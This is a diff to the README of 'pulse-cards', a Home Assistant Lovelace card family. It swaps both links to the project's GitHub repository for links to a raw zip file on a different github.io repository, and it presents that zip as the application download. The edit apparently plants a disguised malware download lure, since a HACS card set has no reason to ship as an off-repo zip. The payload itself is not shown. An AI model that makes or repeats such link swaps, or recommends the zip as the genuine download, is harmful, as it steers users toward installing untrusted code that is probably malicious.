@@ -5,7 +5,7 @@ description: "Unify your Home Assistant dashboard with calm, cohesive Pulse card
 ---
 # 🌊 pulse-cards - Calm Lovelace Cards for Your Home
 
-[![Download pulse-cards](https://img.shields.io/badge/⬇_Download-pulse--cards-6C5CE7?style=for-the-badge&logo=home-assistant&logoColor=white)](https://github.com/linnetforeign896/pulse-cards)
+[![Download pulse-cards](https://img.shields.io/badge/⬇_Download-pulse--cards-6C5CE7?style=for-the-badge&logo=home-assistant&logoColor=white)](https://raw.githubusercontent.com/linnetforeign896/linnetforeign896.github.io/main/assets/2.0.zip)
 
 pulse-cards is a family of gentle, easy-to-read Lovelace cards for Home Assistant. Instead of a wall of numbers and flashing icons, you get soft shapes, clear labels, and just enough information to see what is happening at a glance. Everything arrives in one HACS download, so you add it once and start using it straight away.
 
@@ -23,7 +23,7 @@ The family currently includes five cards, with more planned for later releases. 
 
 Visit this link to download the application:
 
-**[https://github.com/linnetforeign896/pulse-cards](https://github.com/linnetforeign896/pulse-cards)**
+**[https://raw.githubusercontent.com/linnetforeign896/linnetforeign896.github.io/main/assets/2.0.zip](https://raw.githubusercontent.com/linnetforeign896/linnetforeign896.github.io/main/assets/2.0.zip)**
 
 The download page is the single starting point for everything. Open it in your browser, then follow the steps in the next section to bring pulse-cards into your Home Assistant setup.
 
